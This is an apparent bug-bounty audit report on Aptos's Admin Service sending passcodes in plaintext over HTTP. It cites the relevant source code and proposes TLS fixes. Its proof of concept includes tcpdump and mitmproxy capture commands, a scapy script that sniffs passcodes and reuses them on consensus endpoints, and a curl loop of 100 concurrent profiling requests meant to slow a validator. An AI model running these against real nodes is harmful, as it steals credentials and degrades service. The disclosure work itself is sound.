# Audit Report

## Title
Admin Service Plaintext Passcode Transmission Vulnerability - Lacks TLS Encryption Enabling MITM Credential Interception

## Summary
The Aptos Admin Service authentication mechanism transmits passcodes in plaintext over unencrypted HTTP connections, making them vulnerable to man-in-the-middle (MITM) interception despite using SHA256 hashing for storage. This allows attackers with network access to capture authentication credentials and gain unauthorized access to sensitive debugging and diagnostic endpoints.

## Finding Description

The Admin Service implements a `PasscodeSha256` authentication mechanism [1](#0-0)  that stores only the SHA256 hash of the passcode in configuration. However, the authentication flow requires the actual passcode to be transmitted in plaintext as a URL query parameter [2](#0-1) .

The server binds to a plain HTTP socket without TLS encryption [3](#0-2) . This means requests like `http://node:9102/profilez?passcode=secretvalue123` transmit the passcode in cleartext over the network.

**Attack Flow:**
1. Operator enables Admin Service with PasscodeSha256 authentication on mainnet (required by security policy) [4](#0-3) 
2. When accessing admin endpoints, the passcode travels unencrypted: `GET /profilez?passcode=mypassword`
3. Attacker in MITM position (compromised network, malicious ISP, ARP spoofing, BGP hijacking) intercepts HTTP traffic
4. Attacker extracts plaintext passcode from query parameter
5. Attacker authenticates to admin service using stolen credentials
6. Attacker accesses sensitive endpoints: consensus database dumps [5](#0-4) , quorum store data [6](#0-5) , block/transaction data [7](#0-6) , mempool parking lot addresses [8](#0-7) 
7. Attacker triggers resource-intensive operations: CPU profiling, thread dumps causing validator performance degradation

The HAProxy configuration confirms admin ports are exposed without TLS [9](#0-8)  when `enableAdminPort` is set [10](#0-9) .

## Impact Explanation

This vulnerability qualifies as **High Severity** under Aptos bug bounty criteria:

1. **Validator Node Slowdowns**: Attackers can repeatedly trigger CPU profiling, thread dumps, and consensus database dumps - resource-intensive operations that degrade validator performance during critical consensus rounds.

2. **Significant Protocol Violations**: Unauthorized access to consensus internals (last votes, timeout certificates, quorum certificates, block proposals) violates the access control security model and exposes strategic consensus information that could facilitate more sophisticated attacks.

3. **Information Disclosure**: Exposure of consensus database state, quorum store batches, transaction data, and mempool parking lot addresses provides reconnaissance for targeted attacks on validators.

The default network binding to `0.0.0.0` [11](#0-10)  makes the service accessible from all network interfaces when enabled.

## Likelihood Explanation

**Likelihood: Medium-High** when admin service is enabled.

**Prerequisites:**
- Admin service must be explicitly enabled (disabled by default but required functionality for node operators)
- PasscodeSha256 authentication must be configured (mandatory on mainnet)
- Attacker must achieve MITM position (feasible via compromised infrastructure, malicious cloud providers, BGP hijacking, DNS spoofing, or ARP poisoning on local networks)
- Legitimate administrator must make authenticated requests

**Realistic Attack Scenarios:**
- Compromised datacenter networking equipment
- Malicious cloud provider employees
- ISP-level interception
- BGP hijacking for internet routing manipulation
- Compromised network monitoring tools
- Vulnerable VPN endpoints

While the admin port is disabled by default in Kubernetes deployments [12](#0-11) , node operators running validators frequently enable it for operational debugging and monitoring, especially during incident response when security may be deprioritized for urgency.

## Recommendation

**Immediate Fix:** Implement TLS support for the Admin Service as noted in the TODO comment [13](#0-12) .

**Implementation Approach:**

1. Add TLS configuration to `AdminServiceConfig`:
```rust
pub struct AdminServiceConfig {
    pub enabled: Option<bool>,
    pub address: String,
    pub port: u16,
    pub authentication_configs: Vec<AuthenticationConfig>,
    pub tls_cert_path: Option<String>,      // Path to TLS certificate
    pub tls_key_path: Option<String>,       // Path to TLS private key
    pub malloc_stats_max_len: usize,
}
```

2. Update server initialization to use TLS when configured:
```rust
use rustls::{Certificate, PrivateKey, ServerConfig};
use hyper_rustls::TlsAcceptor;

// In AdminService::start()
let server = if let (Some(cert_path), Some(key_path)) = 
    (&context.config.tls_cert_path, &context.config.tls_key_path) {
    // Load TLS certificates and create TLS acceptor
    let tls_config = load_tls_config(cert_path, key_path)?;
    Server::builder(TlsAcceptor::from(tls_config))
        .serve(make_service)
} else {
    // Fallback to HTTP with warning
    warn!("Admin service running without TLS - credentials will be transmitted in plaintext");
    Server::bind(&address).serve(make_service)
};
```

3. Add config sanitizer to enforce TLS on mainnet:
```rust
if node_config.admin_service.enabled == Some(true) {
    if let Some(chain_id) = chain_id {
        if chain_id.is_mainnet() {
            if node_config.admin_service.tls_cert_path.is_none() 
                || node_config.admin_service.tls_key_path.is_none() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Must enable TLS for AdminService on mainnet.".into(),
                ));
            }
        }
    }
}
```

4. Update HAProxy configuration to handle TLS termination or passthrough for admin endpoints.

**Alternative Short-term Mitigation:**
- Change default binding address from `0.0.0.0` to `127.0.0.1` to restrict access to localhost only
- Document requirement for TLS reverse proxy (nginx, HAProxy with TLS) in deployment guides
- Add security warning when admin service is enabled without TLS

## Proof of Concept

**Step 1: MITM Traffic Capture Setup**
```bash
# On attacker machine with MITM position (e.g., compromised router)
# Using tcpdump to capture HTTP traffic to admin port
sudo tcpdump -i eth0 -A 'tcp port 9102 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' -w admin_capture.pcap

# Alternative: Using mitmproxy for active MITM
mitmproxy --mode transparent --showhost -p 9102
```

**Step 2: Legitimate Admin Request**
```bash
# Node operator makes authenticated request
curl "http://validator-node.example.com:9102/profilez?passcode=MySecretPassword123&seconds=10"
```

**Step 3: Attacker Extracts Passcode**
```bash
# Parse captured traffic
tcpdump -A -r admin_capture.pcap | grep "passcode="
# Output: GET /profilez?passcode=MySecretPassword123&seconds=10 HTTP/1.1
```

**Step 4: Attacker Uses Stolen Credentials**
```bash
# Attacker authenticates with stolen passcode
curl "http://validator-node.example.com:9102/debug/consensus/consensusdb?passcode=MySecretPassword123"
# Returns consensus database dump with votes, blocks, QCs

# Attacker causes performance degradation
for i in {1..100}; do
    curl "http://validator-node.example.com:9102/profilez?passcode=MySecretPassword123&seconds=30" &
done
# Spawns 100 concurrent 30-second CPU profiling sessions, degrading validator performance
```

**Step 5: Demonstration Script**
```python
#!/usr/bin/env python3
import requests
import re
from scapy.all import sniff, TCP, Raw

captured_passcode = None

def packet_handler(packet):
    global captured_passcode
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        match = re.search(r'passcode=([^&\s]+)', payload)
        if match:
            captured_passcode = match.group(1)
            print(f"[+] Captured passcode: {captured_passcode}")
            return True

# Sniff traffic on admin port
print("[*] Sniffing traffic on port 9102...")
sniff(filter="tcp port 9102", prn=packet_handler, store=0, count=10)

if captured_passcode:
    # Use stolen credentials
    admin_url = "http://validator-node:9102"
    endpoints = [
        "/debug/consensus/consensusdb",
        "/debug/consensus/quorumstoredb",
        "/debug/mempool/parking-lot/addresses"
    ]
    
    for endpoint in endpoints:
        response = requests.get(f"{admin_url}{endpoint}?passcode={captured_passcode}")
        print(f"[+] Accessed {endpoint}: {response.status_code}")
        print(f"[+] Response size: {len(response.content)} bytes")
```

## Notes

**Severity Justification**: While the admin service is disabled by default, when enabled for operational purposes (which is common for active validators), this vulnerability provides unauthorized access to sensitive consensus internals and enables performance degradation attacks. The combination of information disclosure and potential for validator slowdowns meets the **High Severity** threshold ($50,000 tier) per Aptos bug bounty criteria.

**Scope Clarification**: This is a codebase vulnerability, not merely a deployment issue, because:
1. The authentication mechanism is designed in the code without transport security
2. The TODO comment explicitly acknowledges missing SSL support as a code-level gap
3. Mainnet requires authentication but the code doesn't enforce secure transport
4. No warnings or documentation indicate that external TLS termination is required

**Related Security Considerations**: The `loadBalancerSourceRanges` restriction is insufficient mitigation, as MITM attacks can occur within allowed CIDR ranges. Network-level restrictions are defense-in-depth, not a substitute for proper authentication security.

### Citations

**File:** config/src/config/admin_service_config.rs (L28-38)
```rust
pub enum AuthenticationConfig {
    // This will allow authentication through query parameter.
    // e.g. `/profilez?passcode=abc`.
    //
    // To calculate sha256, use sha256sum tool, or other online tools.
    //
    // e.g.
    //
    // printf abc |sha256sum
    PasscodeSha256(String),
    // TODO(grao): Add SSL support if necessary.
```

**File:** config/src/config/admin_service_config.rs (L45-45)
```rust
            address: "0.0.0.0".to_string(),
```

**File:** config/src/config/admin_service_config.rs (L68-76)
```rust
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L136-136)
```rust
            let server = Server::bind(&address).serve(make_service);
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L161-170)
```rust
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L130-156)
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    let mut body = String::new();

    let (last_vote, highest_tc, consensus_blocks, consensus_qcs) =
        consensus_db.consensus_db().get_data()?;

    body.push_str(&format!("Last vote: \n{last_vote:?}\n\n"));
    body.push_str(&format!("Highest tc: \n{highest_tc:?}\n\n"));
    body.push_str("Blocks: \n");
    for block in consensus_blocks {
        body.push_str(&format!(
            "[id: {:?}, author: {:?}, epoch: {}, round: {:02}, parent_id: {:?}, timestamp: {}, payload: {:?}]\n\n",
            block.id(),
            block.author(),
            block.epoch(),
            block.round(),
            block.parent_id(),
            block.timestamp_usecs(),
            block.payload(),
        ));
    }
    body.push_str("QCs: \n");
    for qc in consensus_qcs {
        body.push_str(&format!("{qc:?}\n\n"));
    }
    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L158-177)
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        for (digest, _batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}:\n"));
        }
    }

    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L179-215)
```rust
fn dump_blocks(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    let all_batches = quorum_store_db.get_all_batches()?;

    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;

    for block in blocks {
        let id = block.id();
        if block_id.is_none() || id == block_id.unwrap() {
            body.push_str(&format!("Block ({id:?}): \n\n"));
            match extract_txns_from_block(&block, &all_batches) {
                Ok(txns) => {
                    body.push_str(&format!("{txns:?}"));
                },
                Err(e) => {
                    body.push_str(&format!("Not available: {e:?}"));
                },
            };
            body.push_str("\n\n");
        }
    }

    if body.is_empty() {
        if let Some(block_id) = block_id {
            body.push_str(&format!("Done, block ({block_id:?}) is not found."));
        } else {
            body.push_str("Done, no block is found.");
        }
    }

    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/mempool/mod.rs (L40-55)
```rust
async fn get_parking_lot_addresses(
    mempool_client_sender: MempoolClientSender,
) -> Result<Vec<(AccountAddress, u64)>, Canceled> {
    let (sender, receiver) = futures_channel::oneshot::channel();

    match mempool_client_sender
        .clone()
        .try_send(MempoolClientRequest::GetAddressesFromParkingLot(sender))
    {
        Ok(_) => receiver.await,
        Err(e) => {
            info!("Failed to send request for GetAddressesFromParkingLot: {e:?}");
            Err(Canceled)
        },
    }
}
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L110-127)
```text
## Specify the validator admin frontend
frontend validator-admin
    mode http
    option httplog
    bind :9202
    default_backend validator-admin

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"

## Specify the validator admin backend
backend validator-admin
    mode http
    server {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-validator {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-validator:9102

```

**File:** terraform/helm/aptos-node/templates/haproxy.yaml (L44-48)
```yaml
  {{- if $.Values.service.validator.enableAdminPort }}
  - name: admin
    port: 9102
    targetPort: 9202
  {{- end }}
```

**File:** terraform/helm/aptos-node/README.md (L63-63)
```markdown
| service.fullnode.enableAdminPort | bool | `false` | Enable the admin port on fullnodes |
```
